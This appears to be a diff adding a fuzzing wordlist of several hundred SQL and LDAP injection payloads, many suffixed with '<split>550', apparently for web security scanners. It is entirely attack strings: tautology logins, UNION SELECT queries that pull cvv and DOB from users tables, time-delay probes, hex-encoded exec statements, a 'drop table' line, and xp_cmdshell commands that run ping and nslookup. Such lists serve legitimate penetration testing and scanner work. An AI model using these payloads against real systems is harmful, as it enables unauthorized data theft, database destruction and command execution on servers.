@@ -1,0 +1,446 @@
+'; drop table usertable;--
+whatever' or '1'<>'2
+whatever'or'1'like'1
+'
+a' or 1=1--
+"a"" or 1=1--"
+ or a = a
+a' or 'a' = 'a
+1 or 1=1
+a' waitfor delay '0:0:10'--
+1 waitfor delay '0:0:10'--
+declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
+declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+a'
+?
+' or 1=1
+ý or 1=1 --
+x' AND userid IS NULL; --
+x' AND email IS NULL; --
+anything' OR 'x'='x
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND members.email IS NULL; --
+x' OR full_name LIKE '%Bob%
+23 OR 1=1
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'
+'%20or%20''='
+'%20or%20'x'='x
+%20or%20x=x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+ or 0=0 #"
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+ or 1=1 or ""=
+' or a=a--
+ or a=a
+') or ('a'='a
+) or (a=a
+hi or a=a
+hi or 1=1 --"
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+"hi"") or (""a""=""a"
+'hi' or 'x'='x';
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+<>"'%;)(&+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+a' or 3=3--
+"a"" or 3=3--"
+' or 3=3
+ý or 3=3 --
+2' OR name LIKE '%25<split>550
+1' or name like '%25<split>550
+1' or id like '%25<split>550
+' or name like '%25<split>550
+1' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+1' AND users.cvv IS NULL --<split>550
+1' AND DOB IS NULL --<split>550
+1' AND cvv IS NULL --<split>550
+1' OR 'x'='x'--<split>550
+1' or 1=1 or 'x'='y'--<split>550
+1' UNION ALL SELECT * from users where 1 or 1=1--<split>550
+1' or 1=1 or ''=''--<split>550
+' or 1=1 or ''=''--<split>550
+("hi")' or ('a'='a')--<split>550
+a' or 'a' = 'a'--<split>550
+joe' or '1'='1'--<split>550
+1' UNION SELECT * from users where 1 or 1=1--<split>550
+hi' or 1=1--<split>550
+hi' or 'a'='a'--<split>550
+a' or 1=1--<split>550
+%20or%20'x'='x'--<split>550
+' or 0=0 --<split>550
+a' or 3=3--<split>550
+Joe' or 0=0 --<split>550
+Joe' or 'a'='a'--<split>550
+1' or ''=''--<split>550
+' or 1=1--<split>550
+'%20or%201=1--<split>550
+%27%20or%201=1--<split>550
+' or 3=3--<split>550
+2 OR name LIKE '%25'<split>550
+1 or name like '%25'<split>550
+1 or id like '%25'<split>550
+1 or name like '%25'<split>550
+1 OR 120=(SELECT COUNT(*) FROM users) --<split>550
+1 AND users.cvv IS NULL --<split>550
+1 AND DOB IS NULL --<split>550
+1 AND cvv IS NULL --<split>550
+1 OR 'x'='x'<split>550
+1 or 1=1 or 'x'='y'<split>550
+1 UNION ALL SELECT * from users where 1 or 1=1<split>550
+1 or 1=1 or ''=''<split>550
+'' or 1=1 or ''=''<split>550
+('hi') or ('a'='a')<split>550
+'a' or 'a' = 'a'<split>550
+1 UNION SELECT * from users where 1 or 1=1<split>550
+'joe' or '1'='1'--<split>550
+(%27%27)%20or%20(%27x%27=%27x%27)<split>550
+('') or ('a'='a')<split>550
+'hi' or 1=1--<split>550
+'hi' or 'a'='a'<split>550
+'a' or 1=1--<split>550
+''%20or%20'x'='x'<split>550
+'' or 0=0 --<split>550
+'a' or 3=3--<split>550
+'Joe' or 0=0 #<split>550
+'Joe' or 'a'='a'<split>550
+1%20or%20''=''<split>550
+1 or ''=''<split>550
+'Joe' or 1=1<split>550
+'Joe' %20or%201=1<split>550
+'Joe %27%20or%201=1<split>550
+'Joe' or 3=3<split>550
+2' OR name LIKE '%25<split>550
+1' or name like '%25<split>550
+1' or id like '%25<split>550
+' or name like '%25<split>550
+1' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+1' AND users.cvv IS NULL --<split>550
+1' AND DOB IS NULL --<split>550
+1' AND cvv IS NULL --<split>550
+1' OR 'x'='x'--<split>550
+1' or 1=1 or 'x'='y'--<split>550
+1' UNION ALL SELECT * from users where 1 or 1=1--<split>550
+1' or 1=1 or ''=''--<split>550
+' or 1=1 or ''=''--<split>550
+("hi")' or ('a'='a')--<split>550
+a' or 'a' = 'a'--<split>550
+joe' or '1'='1'--<split>550
+1' UNION SELECT * from users where 1 or 1=1--<split>550
+hi' or 1=1--<split>550
+hi' or 'a'='a'--<split>550
+a' or 1=1--<split>550
+'%20or%20'x'='x'--<split>550
+' or 0=0 --<split>550
+a' or 3=3--<split>550
+Joe' or 0=0 --<split>550
+Joe' or 'a'='a'--<split>550
+1' or ''=''--<split>550
+' or 1=1--<split>550
+' %20or%201=1--<split>550
+%27%20or%201=1--<split>550
+' or 3=3--<split>550
+name union all select null, to_char(dob) from users<split>550
+name union select null, to_char(dob) from users<split>550
+2' OR name LIKE '%25<split>550
+1' or name like '%25<split>550
+1' or id like '%25<split>550
+' or name like '%25<split>550
+1' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+1' AND users.cvv IS NULL --<split>550
+1' AND DOB IS NULL --<split>550
+1' AND cvv IS NULL --<split>550
+1' OR 'x'='x'--<split>550
+1' or 1=1 or 'x'='y'--<split>550
+1' UNION ALL SELECT * from users where 1 or 1=1--<split>550
+1' or 1=1 or ''=''--<split>550
+' or 1=1 or ''=''--<split>550
+("hi")' or ('a'='a')--<split>550
+a' or 'a' = 'a'--<split>550
+joe' or '1'='1'--<split>550
+1' UNION SELECT * from users where 1 or 1=1--<split>550
+hi' or 1=1--<split>550
+hi' or 'a'='a'--<split>550
+a' or 1=1--<split>550
+'%20or%20'x'='x'--<split>550
+' or 0=0 --<split>550
+a' or 3=3--<split>550
+Joe' or 0=0 --<split>550
+Joe' or 'a'='a'--<split>550
+1' or ''=''--<split>550
+' or 1=1--<split>550
+1%27%20or%201=1--<split>550
+' %20or%201=1--<split>550
+' or 3=3--<split>550
+1 union select to_char(dob) from users<split>550
+1 union all select to_char(dob) from users<split>550
+select * from users where name = 'x' OR name LIKE 'Joe'<split>550
+select * from users where name = '' or name like ''<split>550
+select * from users where id = '' or id like ''<split>550
+select * from users where name = '' or name like ''<split>550
+select * from users where name ='x' AND users.cvv IS NULL --<split>550
+select * from users where name = 'x' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+select * from users where name ='Joe' AND DOB IS NULL --<split>550
+select * from users where name ='Joe' AND cvv IS NULL --<split>550
+select * from users where name ='anything' OR 'x'='x'<split>550
+select * from users where name = 'x' or 1=1 or 'x'='y'<split>550
+select * from users where name ='Joe' UNION ALL SELECT * from users where 1 or 1=1<split>550
+select * from users where name = '' or 1=1 or ''=''<split>550
+select * from users where name = ('hi') or ('a'='a')<split>550
+select * from users where name = 'a' or 'a' = 'a'<split>550
+select * from users where name = 'joe' or '1'='1'--<split>550
+select * from users where name ='Joe' UNION SELECT * from users where 1 or 1=1<split>550
+select * from users where name = (%27%27)%20or%20(%27x%27=%27x%27)<split>550
+select * from users where name=('') or ('a'='a')<split>550
+select * from users where name='hi' or 1=1--<split>550
+select * from users where name='hi' or 'a'='a'<split>550
+select * from users where name='a' or 1=1--<split>550
+select * from users where name=''%20or%20'x'='x'<split>550
+select * from users where name='' or 0=0 --<split>550
+select * from users where name='a' or 3=3--<split>550
+select * from users where name='Joe' or 0=0 #<split>550
+select * from users where name='Joe' or 'a'='a'<split>550
+select * from users where name='Joe'%20or%20''=''<split>550
+select * from users where name='Joe' or 1=1<split>550
+select * from users where name='Joe' or ''=''<split>550
+select * from users where name='Joe' %20or%201=1<split>550
+select * from users where name='Joe %27%20or%201=1<split>550
+select * from users where name='Joe' or 3=3<split>550
+name=x' or name like '%25'--<split>550
+name=t'exec master..xp_cmdshell 'nslookup%20www%2egoogle%2ecom'--<split>550
+name='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e10%2e1%2e255'--<split>550
+name=x' AND 100=(SELECT COUNT(*) FROM address) --<split>550
+name=x' OR cvv IS NULL--<split>550
+name=anything' OR 'x'='x<split>550
+name=x' or 1=1 or 'x'='y<split>550
+name=' UNION ALL SELECT * from users where 1 or 1=1--<split>550
+name='or 1=1 or ''='<split>550
+name=a' or 'a' = 'a<split>550
+name=' or '1'='1'--<split>550
+name=' UNION SELECT * from users--<split>550
+name=a' or 1=1--<split>550
+name=%27%20or%20%27x%27=%27x<split>550
+name='or 0=0 --<split>550
+name=a' or 3=3--<split>550
+name=' or 1=1--<split>550
+name=' or 1 --'<split>550
+name=' or 'a'='a'--<split>550
+name=%27%20or%201=1--<split>550
+name=x' or 3=3--<split>550
+name='2' OR name LIKE 'Joe'<split>550
+name='Jon' or name like 'Joe'<split>550
+name='1' or id like '2'<split>550
+name='1' or name like 'Joe'<split>550
+name='Joe' OR 120=(SELECT COUNT(*) FROM users) --<split>550
+name='1' or name like 'Sammy'<split>550
+name='1' AND users.cvv IS NULL --<split>550
+name='1' AND DOB IS NULL --<split>550
+name='1' AND cvv IS NULL --<split>550
+name='1' OR 'x'='x'<split>550
+name='1' or 1=1 or 'x'='y'--<split>550
+name='1' UNION ALL SELECT * from users where 1 or 1=1--<split>550
+name='' or 1=1 or ''=''--<split>550
+name='1' or 1=1 or ''=''--<split>550
+name=(1) or ('a'='a')--<split>550
+name=1 or 'a' = 'a'--<split>550
+name=1 or '1'='1'--<split>550
+name='Joe' UNION SELECT * from users where 1 or 1=1--<split>550
+name=('') or ('a'='a')--<split>550
+name=('') or ('x'='x')--<split>550
+name='' or 'a'='a'--<split>550
+name='' or 1=1--<split>550
+name='a' or 1=1--<split>550
+name=%27%27%20or%20%27x%27%3D%27x%27--<split>550
+name='a' or 3=3--<split>550
+name='' or 0=0 --<split>550
+name='Joe' or 0=0 #<split>550
+name='Joe' or 'a'='a'--<split>550
+name='Joe' or 'a'='a'<split>550
+name='1' or ''=''--<split>550
+name='Joe' %20or%201=1--<split>550
+name='Joe' or 1=1--<split>550
+name='Joe %27%20or%201=1--<split>550
+name='Joe' or 3=3--<split>550
+'2' OR 'name' LIKE 'Joe'<split>550
+'1' or 'name' like 'Joe'<split>550
+'1' or users.id like 1<split>550
+'1' or 'users.name' like'Joe'<split>550
+'1' OR 120=(SELECT COUNT(*) FROM users)<split>550
+'1' AND 'users.cvv' IS NULL<split>550
+'1' AND 'DOB' IS NULL<split>550
+'1' AND 'cvv' IS NULL<split>550
+'1' OR 'x'='x'<split>550
+'1' or 1=1 or 'x'='y'<split>550
+'1' or 1=1 or ''=''--<split>550
+'' or 1=1 or ''=''--<split>550
+('hi') or ('a'='a')<split>550
+'a' or 'a' = 'a'<split>550
+'joe' or '1'='1'<split>550
+'hi' or 1=1--<split>550
+'hi' or 'a'='a'--<split>550
+'a' or 1=1--<split>550
+''%20or%20'x'='x'--<split>550
+'' or 0=0 --<split>550
+'a' or 3=3--<split>550
+'Joe' or 0=0 --<split>550
+'Joe' or 'a'='a'--<split>550
+1 or 'a'='a'<split>550
+1 or '1'='1'<split>550
+'' or 1=1--<split>550
+'' %20or%201=1--<split>550
+'' or 3=3--<split>550
+%27%27%20or%201=1--<split>550
+'2' OR 'name' LIKE 'Joe'<split>550
+'1' or 'name' like 'Joe'<split>550
+'1' or users.id like 1<split>550
+'1' or 'users.name' like'Joe'<split>550
+'1' OR 120=(SELECT COUNT(*) FROM users)<split>550
+'1' AND 'users.cvv' IS NULL<split>550
+'1' AND 'DOB' IS NULL<split>550
+'1' AND 'cvv' IS NULL<split>550
+'1' OR 'x'='x'<split>550
+'1' or 1=1 or 'x'='y'<split>550
+'1' or 1=1 or ''=''--<split>550
+'' or 1=1 or ''=''--<split>550
+('hi') or ('a'='a')<split>550
+'a' or 'a' = 'a'<split>550
+'joe' or '1'='1'<split>550
+'hi' or 'a'='a'--<split>550
+'hi' or 1=1--<split>550
+'a' or 1=1--<split>550
+'' or 0=0 --<split>550
+''%20or%20'x'='x'--<split>550
+'a' or 3=3--<split>550
+'Joe' or 0=0 --<split>550
+'Joe' or 'a'='a'--<split>550
+1 or 'a'='a'<split>550
+1 or '1'='1'<split>550
+'' or 1=1--<split>550
+'' %20or%201=1--<split>550
+%27%27%20or%201=1--<split>550
+'' or 3=3--<split>550
+'2' OR 'name' LIKE 'Joe'<split>550
+'1' or 'name' like 'Joe'<split>550
+'1' or id like 1<split>550
+'1' or 'name' like'Joe'<split>550
+'1' OR 120=(SELECT COUNT(*) FROM users)<split>550
+'1' AND 'users.cvv' IS NULL<split>550
+'1' AND 'DOB' IS NULL<split>550
+'1' AND 'cvv' IS NULL<split>550
+'1' OR 'x'='x'<split>550
+'1' or 1=1 or 'x'='y'<split>550
+'1' or 1=1 or ''=''--<split>550
+' or 1=1 or ''=''--<split>550
+'("hi")' or ('a'='a')--<split>550
+'a' or 'a' = 'a'<split>550
+'joe' or '1'='1'<split>550
+'hi' or 1=1--<split>550
+'hi' or 'a'='a'--<split>550
+'a' or 1=1--<split>550
+''%20or%20'x'='x'--<split>550
+'' or 0=0 --<split>550
+'a' or 3=3--<split>550
+'Joe' or 0=0 --<split>550
+'Joe' or 'a'='a'--<split>550
+1 or 'a'='a'<split>550
+1 or '1'='1'<split>550
+' or 1=1--<split>550
+%27%20or%201=1--<split>550
+' %20or%201=1--<split>550
+' or 3=3--<split>550
+bar' AND '1'='1' -- 
+bar OR 1=1 -- 
+whatever AND 1=1 -- 
+whatever" AND "1"="1
+whatever AND 1=1
+ZAP" AND "1"="1
+'; select "java.lang.Thread.sleep"(5000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- 
+'; select "java.lang.Thread.sleep"(5000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = 'SYSTEM_COLUMNS' and COLUMN_NAME = 'TABLE_NAME' -- 
